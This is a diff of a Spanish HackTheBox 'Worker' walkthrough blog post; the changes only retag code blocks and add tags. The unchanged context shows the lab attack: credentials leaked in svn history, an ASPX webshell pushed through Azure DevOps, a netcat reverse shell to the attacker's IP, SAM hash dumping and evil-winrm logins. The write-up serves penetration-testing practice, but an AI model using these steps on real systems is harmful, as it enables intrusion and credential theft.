@@ -3,6 +3,7 @@ layout      : post
 title       : "HackTheBox - Worker"
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270banner.png
 category    : [ htb ]
+tags        : [ devOps, repositories ]
 ---
 Máquina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores.
 
@@ -41,19 +42,19 @@ Tendremos como siempre 3 fases:
 
 Empezaremos realizando un escaneo de puertos sobre la máquina para saber que servicios está corriendo.
 
-```sh
+```bash
 –» nmap -p- --open -v -Pn 10.10.10.203
 ```
 
 En este caso vamos a agregarle el parámetro `-T` para hacer el escaneo más rápido.
 
-```sh
+```bash
 –» nmap -p- --open -v -Pn -T5 10.10.10.203
 ```
 
 Aún sigue lento, cambiemos el `-T` por `--min-rate`:
 
-```sh
+```bash
 –» nmap -p- --open -v -Pn --min-rate=2000 10.10.10.203 -oG initScan
 ```
 
@@ -74,7 +75,7 @@ Perfecto va mucho más rápido.
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |
 
-```sh
+```bash
 –» cat initScan 
 # Nmap 7.80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.203
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -93,7 +94,7 @@ Muy bien, tenemos los siguientes servicios:
 
 Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:
 
-```sh
+```bash
 –» nmap -p 80,3690,5985 -sC -sV 10.10.10.203 -oN portScan
 ```
 
@@ -104,7 +105,7 @@ Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello o
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 –» cat portScan 
 # Nmap 7.80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p 80,3690,5985 -sC -sV -oN portScan 10.10.10.203
 Nmap scan report for 10.10.10.203
@@ -155,7 +156,7 @@ Tendríamos:
 
 En nuestro caso quedaría así:
 
-```sh
+```bash
 –» svn co svn://10.10.10.203/ repository_copy/
 A    repository_copy/dimension.worker.htb
 A    repository_copy/dimension.worker.htb/LICENSE.txt
@@ -234,7 +235,7 @@ Perfecto, tenemos una copia del repositorio en nuestra máquina, démosle un vis
 * Nos muestra lo que parece ser el dominio al que resuelve ese repositorio: `dimension.worker.htb`.
 * Otro dominio e información extra en el archivo `moved.txt`.
 
-```sh
+```bash
 –» cat moved.txt 
 This repository has been migrated and will no longer be maintaned here.
 You can find the latest version at: http://devops.worker.htb
@@ -244,7 +245,7 @@ You can find the latest version at: http://devops.worker.htb
 
 Pues vamos a tener que jugar con el archivo `/etc/hosts` para que al entrar a la dirección `10.10.10.203` nos resuelva a los dominios `dimension.worker.htb` y `devops.worker.htb` que al parecer son los que realmente están siendo mantenidos por el equipo **Worker**.
 
-```sh
+```bash
 –» cat /etc/hosts
 ...
 10.10.10.203  dimension.worker.htb devops.worker.htb
@@ -272,7 +273,7 @@ Si entramos a `work` nos muestra lo que parecen ser varios vHost, si ponemos el 
 
 Puede ser un gran (gran) rabbit hole, pero igual quiero probar si obtenemos algo. Agreguémoslos al `/etc/hosts`.
 
-```sh
+```bash
 –» cat /etc/hosts
 ...
 10.10.10.203  dimension.worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb
@@ -285,7 +286,7 @@ Seguí buscando información sobre `svn` y después de un rato entendí varios d
 
 Podemos ver los logs del repositorio:
 
-```sh
+```bash
 –» svn log svn://10.10.10.203/
 ------------------------------------------------------------------------
 r5 | nathen | 2020-06-20 08:52:00 -0500 (sáb 20 de jun de 2020) | 1 línea
@@ -312,7 +313,7 @@ First version
 
 * Podemos decirle que haga un `verbose` para que sea más explicito con la info:
 
-```sh
+```bash
 –» svn log -v svn://10.10.10.203/
 ------------------------------------------------------------------------
 r5 | nathen | 2020-06-20 08:52:00 -0500 (sáb 20 de jun de 2020) | 1 línea
@@ -364,14 +365,14 @@ Vemos una traza de la fecha, hora, el ID de cada log (r*), el usuario y que se h
 
 Encontré [como podemos ver que cambio se realizó en cada **commit**](http://svnbook.red-bean.com/en/1.7/svn.tour.revs.specifiers.html#svn.tour.revs.keywords) o [acá también](http://svnbook.red-bean.com/es/1.0/svn-ch-3-sect-3.html) (si es que hicieron algún cambio):
 
-```sh
+```bash
 –» svn diff svn://10.10.10.203/
 svn: E195002: No se especificaron todas las revisiones requeridas
 ```
 
 Con `-r` le pasamos cuál **commit** queremos revisar (también se puede poner un rango). Revisemos el `2` que fue cuando se agregó el archivo `deploy.ps1`.
 
-```sh
+```bash
 –» svn diff -r2 svn://10.10.10.203/
 Index: deploy.ps1
 ===================================================================
@@ -388,7 +389,7 @@ Index: deploy.ps1
 
 Opa, tenemos unas posibles credenciales. En el siguiente commit se arrepiente de lo que subio :(:
 
-```sh
+```bash
 –» svn diff -r3 svn://10.10.10.203/
 Index: deploy.ps1
 ===================================================================
@@ -435,7 +436,7 @@ Primero nos posicionamos en el repositorio que queramos para obtener el link y p
 
 ![270pagedevopsrepolens](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsrepolens.png)
 
-```sh
+```bash
 –» git clone http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
 Clonando en 'lens'...
 Username for 'http://devops.worker.htb': nathen
@@ -454,7 +455,7 @@ Ahora agregamos el archivo, hacemos el commit y el push.
 
 * [Encontré esta webshell sencilla](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx).
 
-```sh
+```bash
 –» vim candelapura.aspx 
 –» git add .
 –» git commit -m "Quemando esto"
@@ -477,7 +478,7 @@ error: falló el push de algunas referencias a 'http://devops.worker.htb/ekenas/
 
 Obtenemos el error (: Ahora procedemos a crear una nueva rama:
 
-```sh
+```bash
 –» git checkout -b feature/patestpa 
 Cambiado a nueva rama 'feature/patestpa'
 –» git push
@@ -529,7 +530,7 @@ Ahora si el archivo esta en la raiz del repo, entonces podremos ingresar a el me
 
 Perfectooooooooooooooooooooo, ahora podriamos subir el binario `netcat`, para mediante `certutil.exe` o `PowerShell` subirlo a la maquina y despues usarlo para entablarnos una reverse shell, a ver:
 
-```
+```powershell
 #Web
 /c dir c:\Windows\Temp
 
@@ -544,7 +545,7 @@ lens  nc.exe  repository_copy
 
 ![270pagedevopswebshellupnc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopswebshellupnc.png)
 
-```
+```powershell
 #Web
 /c c:\Windows\Temp\nc.exe 10.10.14.161 4433 -e cmd.exe
 ```
@@ -775,7 +776,7 @@ steps:
 
 Con los archivos en nuestra maquina hacemos:
 
-```sh
+```bash
 –» pwdump sam system
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -795,7 +796,7 @@ En este punto no sabría como obtener una Shell como el usuario `nt autority\sys
 
 Probemos a crear un usuario y lo asignamos al grupo administradores mediante la web. (Tambien podemos entrar a la máquina mediante el puerto WinRM (5895) con el usuario `robisl`).
 
-```sh
+```bash
 –» evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11' 
 
 Evil-WinRM shell v2.3
@@ -885,7 +886,7 @@ Global Group memberships     *None
 
 Yyyyy
 
-```sh
+```bash
 –» evil-winrm -i 10.10.10.203 -u 'carlitosway' -p 'casl0$3lw@y' 
 
 Evil-WinRM shell v2.3
